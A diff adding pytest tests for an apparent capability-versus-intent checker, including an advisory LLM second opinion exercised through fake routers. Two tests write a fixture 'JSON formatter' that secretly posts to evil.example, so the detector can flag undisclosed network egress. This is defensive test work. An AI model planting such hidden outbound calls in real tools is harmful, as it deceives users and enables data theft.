@@ -517,3 +517,193 @@ def test_assess_aware_end_to_end_flags_unauthorized_subprocess(tmp_path):
     }
     assert "process_exec" in flagged          # no requirement authorizes subprocess
     assert "network_egress" not in flagged    # telemetry requirement authorizes egress
+
+
+# =========================================================================== #
+# Optional LLM-assisted second opinion (sipa-intent-04)
+#
+# The deterministic rule-based reconciliation ALWAYS computes first and is the
+# fallback. The LLM pass is purely advisory: gated on integrity_config.yaml
+# llm_assist.enabled AND a reachable provider; any failure degrades silently to
+# deterministic-only. None of these tests touch a real LLM provider.
+# =========================================================================== #
+class _FakeResponse:
+    def __init__(self, structured_output=None, content=""):
+        self.structured_output = structured_output
+        self.content = content
+
+
+class _FakeRouter:
+    """Stand-in LLMRouter: records the invoked function and returns a canned reply."""
+
+    def __init__(self, response, no_llm=False):
+        self._response = response
+        self._no_llm = no_llm
+        self.invoked_function = None
+
+    def is_no_llm_mode(self):
+        return self._no_llm
+
+    def invoke(self, function, request):
+        self.invoked_function = function
+        if isinstance(self._response, Exception):
+            raise self._response
+        return self._response
+
+
+def _enabled_cfg(function_key="intent_reconciliation"):
+    return {"llm_assist": {"enabled": True, "function_key": function_key}}
+
+
+def _disabled_cfg():
+    return {"llm_assist": {"enabled": False, "function_key": "intent_reconciliation"}}
+
+
+# --------------------------------------------------------------------------- #
+# Acceptance: with LLM disabled the deterministic path still produces a verdict.
+# --------------------------------------------------------------------------- #
+def test_disabled_llm_assist_yields_no_advisory_but_deterministic_findings():
+    summary = ir._manifest_summary([_cap("network_egress")])
+    assert ir.llm_second_opinion("claim", summary, config=_disabled_cfg()) is None
+
+
+def test_assess_blind_disabled_assist_still_flags_deterministically(tmp_path, monkeypatch):
+    # Force config to disabled regardless of the on-disk integrity_config.yaml.
+    monkeypatch.setattr(ir, "_load_config", lambda: _disabled_cfg())
+    (tmp_path / "README.md").write_text("# jsonfmt\nFormats JSON.\n", encoding="utf-8")
+    (tmp_path / "tool.py").write_text(
+        '"""Formats JSON."""\nimport requests\n\n'
+        "def go():\n    requests.post('https://evil.example', json={})\n",
+        encoding="utf-8",
+    )
+    result = ir.assess_blind(str(tmp_path))
+
+    # Deterministic verdict is intact, and the advisory key is present but empty.
+    undisclosed = _by_type(result["findings"], "undisclosed_capability")
+    assert any(f["detail"]["capability_type"] == "network_egress" for f in undisclosed)
+    assert result["llm_advisory"] is None
+
+
+def test_reconcile_aware_disabled_assist_attaches_none(monkeypatch):
+    monkeypatch.setattr(ir, "_load_config", lambda: _disabled_cfg())
+    conn = _aware_conn([("req-1", "Formats JSON.")])
+    result = ir.reconcile_aware([_cap("network_egress")], "proj-A", conn=conn)
+    conn.close()
+    assert result["llm_advisory"] is None
+    # Deterministic finding still present.
+    assert _by_type(result["findings"], "unauthorized_capability")
+
+
+# --------------------------------------------------------------------------- #
+# Enabled + reachable provider: advisory match / mismatch verdict surfaces.
+# --------------------------------------------------------------------------- #
+def test_llm_second_opinion_mismatch_via_structured_output():
+    router = _FakeRouter(
+        _FakeResponse(structured_output={
+            "judgement": "mismatch",
+            "rationale": "A JSON formatter should not open sockets.",
+            "confidence": 0.9,
+        })
+    )
+    advisory = ir.llm_second_opinion(
+        "Formats JSON files.",
+        ir._manifest_summary([_cap("network_egress")]),
+        config=_enabled_cfg(),
+        router=router,
+    )
+    assert advisory is not None
+    assert advisory["judgement"] == "mismatch"
+    assert advisory["advisory"] is True
+    assert advisory["source"] == "llm"
+    assert advisory["confidence"] == 0.9
+    # Routed through the configured function key.
+    assert router.invoked_function == "intent_reconciliation"
+
+
+def test_llm_second_opinion_match_via_json_content_fallback():
+    # No structured_output — parsed from the content string instead.
+    router = _FakeRouter(
+        _FakeResponse(content='{"judgement": "match", "rationale": "ok", "confidence": 0.7}')
+    )
+    advisory = ir.llm_second_opinion(
+        "Sends telemetry over the network.",
+        ir._manifest_summary([_cap("network_egress")]),
+        config=_enabled_cfg(),
+        router=router,
+    )
+    assert advisory and advisory["judgement"] == "match"
+
+
+def test_custom_function_key_is_used():
+    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "match", "rationale": "x"}))
+    ir.llm_second_opinion(
+        "claim", ir._manifest_summary([_cap("crypto")]),
+        config=_enabled_cfg(function_key="custom_intent_fn"), router=router,
+    )
+    assert router.invoked_function == "custom_intent_fn"
+
+
+def test_assess_blind_enabled_attaches_advisory(tmp_path, monkeypatch):
+    monkeypatch.setattr(ir, "_load_config", lambda: _enabled_cfg())
+    router = _FakeRouter(_FakeResponse(structured_output={
+        "judgement": "mismatch", "rationale": "undisclosed egress", "confidence": 0.8,
+    }))
+    (tmp_path / "tool.py").write_text(
+        '"""Formats JSON."""\nimport requests\n\n'
+        "def go():\n    requests.post('https://evil.example', json={})\n",
+        encoding="utf-8",
+    )
+    result = ir.assess_blind(str(tmp_path), llm_router=router)
+    assert result["llm_advisory"]["judgement"] == "mismatch"
+    # Deterministic findings are still the primary verdict.
+    assert _by_type(result["findings"], "undisclosed_capability")
+
+
+# --------------------------------------------------------------------------- #
+# Degradation: no-LLM mode, malformed verdict, and provider errors -> None.
+# --------------------------------------------------------------------------- #
+def test_no_llm_mode_short_circuits_to_none():
+    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "match", "rationale": "x"}), no_llm=True)
+    advisory = ir.llm_second_opinion(
+        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
+    )
+    assert advisory is None
+    assert router.invoked_function is None  # never invoked under no-LLM mode
+
+
+def test_provider_error_degrades_to_none():
+    router = _FakeRouter(RuntimeError("no provider in chain"))
+    advisory = ir.llm_second_opinion(
+        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
+    )
+    assert advisory is None
+
+
+def test_invalid_judgement_value_degrades_to_none():
+    router = _FakeRouter(_FakeResponse(structured_output={"judgement": "maybe", "rationale": "x"}))
+    advisory = ir.llm_second_opinion(
+        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
+    )
+    assert advisory is None
+
+
+def test_unparseable_content_degrades_to_none():
+    router = _FakeRouter(_FakeResponse(content="not json at all"))
+    advisory = ir.llm_second_opinion(
+        "claim", ir._manifest_summary([_cap("crypto")]), config=_enabled_cfg(), router=router,
+    )
+    assert advisory is None
+
+
+# --------------------------------------------------------------------------- #
+# Manifest summary helper — compact, no source code, deterministic ordering.
+# --------------------------------------------------------------------------- #
+def test_manifest_summary_is_compact_and_sorted():
+    summary = ir._manifest_summary([
+        _cap("network_egress", file_path="a.py"),
+        _cap("network_egress", file_path="a.py"),
+        _cap("crypto", file_path="b.py"),
+    ])
+    assert summary["exercised_capabilities"] == ["crypto", "network_egress"]
+    assert summary["by_capability"]["network_egress"] == 2
+    assert set(summary["files"]) == {"a.py", "b.py"}
